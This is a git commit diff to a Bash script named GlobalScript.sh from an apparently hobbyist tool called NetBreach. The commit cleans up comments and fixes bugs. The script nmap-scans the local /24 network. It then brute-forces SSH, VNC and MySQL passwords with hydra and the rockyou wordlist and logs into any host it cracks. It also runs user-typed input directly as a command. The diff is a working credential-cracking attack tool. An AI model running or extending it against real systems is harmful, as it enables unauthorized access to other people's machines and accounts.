3d38cae9d375bc53e1b305ba1b17e4d14d182ba7
WilSegale <39059459+WilSegale@users.noreply.github.com>
2024-05-29 14:44:45 -0400

    Update GlobalScript.sh

--- linux/GlobalScript.sh
+++ linux/GlobalScript.sh
@@ -1,17 +1,15 @@
 #!/bin/bash
 
-# file that hold all the variables that need for the program to work properly
+# File that holds all the variables needed for the program to work properly
 source DontEdit.sh
 
 # Function to handle cleanup on exit
-# quits program with ctrl-c
 EXIT_PROGRAM_WITH_CTRL_C() {
     echo -e "${RED}[-]${NC} EXITING SOFTWARE..."
     # Add cleanup commands here
     exit 1
 }
 
-# quits program with ctrl-z
 EXIT_PROGRAM_WITH_CTRL_Z(){
     echo ""
     echo -e "${RED}[-]${NC} EXITING SOFTWARE..."
@@ -22,8 +20,6 @@ EXIT_PROGRAM_WITH_CTRL_Z(){
 # Function to be executed when Ctrl+Z is pressed
 handle_ctrl_z() {
     EXIT_PROGRAM_WITH_CTRL_Z
-    exit 1
-    # Your custom action goes here
 }
 
 # Set up the trap to call the function on SIGTSTP (Ctrl+Z)
@@ -42,11 +38,10 @@ command_exists() {
     command -v "$1" >/dev/null 2>&1
 }
 
-
-# if the user uses the skip function it skips the install proccess of the packages
+# If the user uses the skip function, it skips the install process of the packages
 if [ "$1" = "--skip" ]; then
     RunHackingCommandWithVNC
-# else if the user doent use the skip function it installes the packages
+# Otherwise, it installs the packages
 else
     # Check for required packages
     for package in "${required_packages[@]}"; do
@@ -55,21 +50,21 @@ else
             echo -e "[ ${RED}FAIL${NC} ] The required package ${GREEN}'${package}'${NC} is not installed. Please install it and try again."
             sleep 1 
 
-            #asks the user if they want to install the packages that are mssing
-            echo "Would you like me to install it for you. YES/NO"
+            # Asks the user if they want to install the missing packages
+            echo "Would you like me to install it for you? YES/NO"
 
             read -p ">>> " install
             if [[ " ${yes[*]} " == *" ${install} "* ]]; then
                 bash requirements.sh
                 exit 1
             else
-                echo "Ok stopping program"
+                echo "Ok, stopping program"
                 exit 1
             fi
-            exit 1
         fi
     done
 fi
+
 # Check if the script is run with --help or -h
 if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
     figlet "? HELP ?"
@@ -82,7 +77,7 @@ if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
     echo "To use the program you have to tell the computer what port you want to scan."
     echo "It will then scan the port that you asked for on the network and see if any ports that you asked are open."
     echo "If there are any ports that are open, it will ask for a username and hostname."
-    echo "When you give the program the username and hostname, it will try to crack that given parameters you gave it."
+    echo "When you give the program the username and hostname, it will try to crack the given parameters you gave it."
     echo
 else
     # Check if root user
@@ -90,61 +85,51 @@ else
         echo -e "[ ${RED}FAIL${NC} ]: Please run as root."
         exit 1
     fi
+
     if [[ "$OSTYPE" == "${OS}"* ]]; then
         clear
-        if [[ $EUID -ne $root ]]; then
+        if [[ $EUID -ne 0 ]]; then
             # Error message if not running as root
             echo "ERROR:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
             echo -e "[ ${RED}FAIL${NC} ]: TIME:${CURRENT_TIME} Please run as ROOT. DATE:${CURRENT_DATE}"
-            exit
+            exit 1
         else
             sudo rm -rf hydra.restore
             clear
 
-            #checks if the user is connected to the internet if they are not connceted it tells them they are not connceted and have to connect
+            # Check if the user is connected to the internet
             SITE="https://google.com/"
             if ! curl --head --silent --fail $SITE > /dev/null; then
                 echo "ERROR:TIME:${CURRENT_TIME} Please connect to the internet. DATE:${CURRENT_DATE}" >> ERROR.LOG
                 echo -e "[ ${RED}${BRIGHT}FAIL${NC} ] TIME:${CURRENT_TIME} Please connect to the internet. DATE:${CURRENT_DATE}"
-
                 exit 1
-            else
-                echo ""
             fi
 
-            # Clear the terminal
             clear
 
-            # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
+            # Function to start NetBreach
             NetBreach() {
-                # The logo of the program
                 figlet -f slant "NetBreach"
                 echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
-                echo "If you want to stop the program type 'stop'."
+                echo "If you want to stop the program, type 'stop'."
                 read -p ">>> " service
                 
                 if [[ "${service}" == "ALL" || "${service}" == "all" || "${service}" == "*" ]]; then
-                    # Tells the user that it can take up to an hour to complete the scanning process
                     echo -e "${RED}This can take up to 1 hour to complete.${NC}"
-
-                    # Scan the entire network and display open ports
                     sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
 
-                    # asks if the user want to see scan on a open file or not
-                    read -p "Would you like to see the scan on a open file (Yes or No): " SeeFile
+                    read -p "Would you like to see the scan in an open file (Yes or No): " SeeFile
                     if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
-                        echo "Opeing the scan file"
+                        echo "Opening the scan file"
                         sleep 1
                         open scan.txt
-
                     else
-                        echo -e "[ ${RED}FAIL${NC} ] Ok I will not open the scan.txt file"
+                        echo -e "[ ${RED}FAIL${NC} ] Ok, I will not open the scan.txt file"
                         sleep 1
                     fi
                     
                     hydra -h
                     echo "Put in Hydra first to start the script."
-                    echo ""
                     read -p ">>> " Hydra
 
                     if [[ " ${exit[*]} " == *" ${Hydra} "* ]]; then
@@ -154,155 +139,108 @@ else
                         $Hydra
                         exit 1
                     fi
-
-                # If the user asks what the program does, it goes to a function that helps them and explains what the program does
                 elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
                     echo "Stopping program..."
                     sleep 1
                     exit 1
-                #checks if the user has put nothing into the input feild
-                elif [[ " ${empty[*]} " == *" ${service} "* ]]; then
-                    echo -e "${RED}ERROR:${NC} plase input a number into the input field"
+                elif [[ -z "${service}" ]]; then
+                    echo -e "${RED}ERROR:${NC} Please input a number into the input field"
                     sleep 1
                     exit 1                
-                #checks if the user has put in a letter insted of a number into the input feild
-                for letter in "${alphabet[@]}"; do
-                    if [[ "${letter}" == "${service}" ]]; then
-                        echo "Please enter a number next time"
-                        exit 1
-                    fi
-                done
-
                 else
-                    # Scan specific port
+                    for letter in "${alphabet[@]}"; do
+                        if [[ "${letter}" == "${service}" ]]; then
+                            echo "Please enter a number next time"
+                            exit 1
+                        fi
+                    done
                     sudo nmap -sS 192.168.1.1/24 -p $service -oN $service.log --open
-                    read -p "Would you like to see the ${service} on a open file (Yes or No): " SeeFile
-
+                    read -p "Would you like to see the ${service} in an open file (Yes or No): " SeeFile
                     if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
                         open "${service}.log"
                     else
-                        echo "[-] Ok I will not open the ${service}.log file"
+                        echo "[-] Ok, I will not open the ${service}.log file"
                         sleep 1
                     fi
                 fi
             }
 
             RunHackingCommand() {
-                # Break in the outputs of my code
                 echo
-                # Services to crack the network
-                echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
-                echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
+                echo "To crack VNC (5900), don't type anything in the 'Input Username' prompt"
+                echo "To crack MySQL (3306), type 'localhost' in the 'Input Hostname' prompt"
                 read -p "Input Username: " user
                 read -p "Input Hostname: " host
                 read -p "Input Port: " port
             }
 
-            RunHackingCommandWithVNC() 
+            RunHackingCommandWithVNC() {
                 if [[ $service == 5900 || $service == "VNC" ]]; then
-                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
-                    # If not, it will prompt the user to enter the username and hostname
-                    if [[ $user == "" && $host == "" || $host == "" ]]; then
-                        # No service specified, re-prompt for input
+                    if [[ -z $user && -z $host ]]; then
                         echo "No service specified"
                         NetBreach
-                    # If the user inputs something in the 'Input Username' function and the hostname function,
-                    # it will continue as normal
                     else
-                        # Crack VNC password
                         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
-                        
-                  
-                        # Alerts the user that the computer is trying to connect to the VNC server
                         title="Connecting to ${host}"
-                        Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
                         echo "${title}"
-                        echo "${Connecting_To_VNC_SERVER}"
+                        echo "We are connecting you to '${host}'. Please wait..."
                         sleep 5
-
-                        # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
-                        # Notification for the user to see the computer is connected to the VNC server
                         title="Enter password to ${host}"
-                        Connected_To_VNC_SERVER="We have connected you to '${host}'. Please enter the password to '${host}'. To continue..."
-                        echo
                         echo "${title}"
-                        echo "${Connected_To_VNC_SERVER}"
+                        echo "We have connected you to '${host}'. Please enter the password to '${host}'."
                         read -p "Input username: " username
                         read -p -s "Input password: " password
-                        # Put the
                         echo
                         echo "Loading xfreerdp server..."
                         xfreerdp /u:"${username}" /v:"${host}" /p:"${password}"
-                        exit
+                        exit 1
                     fi
                 fi
-            
+            }
 
             RunHackingCommandWithSSH() {
                 if [[ $service == 22 || $service == "ssh" ]]; then
-                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
-                    # If not, it will prompt the user to enter the username and hostname
-                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
-                        # No service specified, re-prompt for input
+                    if [[ -z $user || -z $host ]]; then
                         echo "No service specified"
                         NetBreach
-                    # If the user inputs something in the 'Input Username' function and the hostname function,
-                    # it will continue as normal
                     else
-
-                        # Crack SSH password
                         hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
-                        # Alerts the user that the computer is trying to connect to the ssh server
                         title="Connecting to ${user}"
-                        Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
-                        echo ""
                         echo "${title}"
-                        echo "${Connecting_To_SSH_SERVER}"
+                        echo "We are connecting you to ${user}. Please wait..."
                         sleep 5
-
-                        # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
-                        echo ""
                         title="Enter password to ${user}"
-                        Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
                         echo "${title}"
-                        echo "${Connected_To_SSH_SERVER}"
-                        echo ""
+                        echo "We have connected you to ${user}. Please enter the password to ${user} to continue..."
                         ssh "${user}@${host}" -p "${port}"
+                        exit 1
                     fi
                 fi
             }
 
             RunHackingCommandWithMySQL() {
                 if [[ $service == 3306 || $service == "mysql" ]]; then
-                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
-                    # If not, it will prompt the user to enter the username and hostname
-                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
-                        # No service specified, re-prompt for input
+                    if [[ -z $user || -z $host ]]; then
                         echo "No service specified"
                         NetBreach
-                    # If the user inputs something in the 'Input Username' function and the hostname function,
-                    # it will continue as normal
                     else
-                        # Crack MySQL password
                         hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
                         echo "Loading MySQL server..."
                         sleep 3
                         mysql -u "${user}" -p -A
+                        exit 1
                     fi
                 fi
             }
 
-            NetBreach # Calls the NetBreach function
-
-            RunHackingCommand # Calls the RunHackingCommand function
-
-            RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function
-
-            RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
+            NetBreach
+            RunHackingCommand
+            RunHackingCommandWithVNC
+            RunHackingCommandWithSSH
+            RunHackingCommandWithMySQL
         fi
     else
         clear
-        # Warning message for wrong OS
         echo "WARNING:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
         echo -e "[ ${RED}${BRIGHT}FAIL${NC} ] TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
     fi
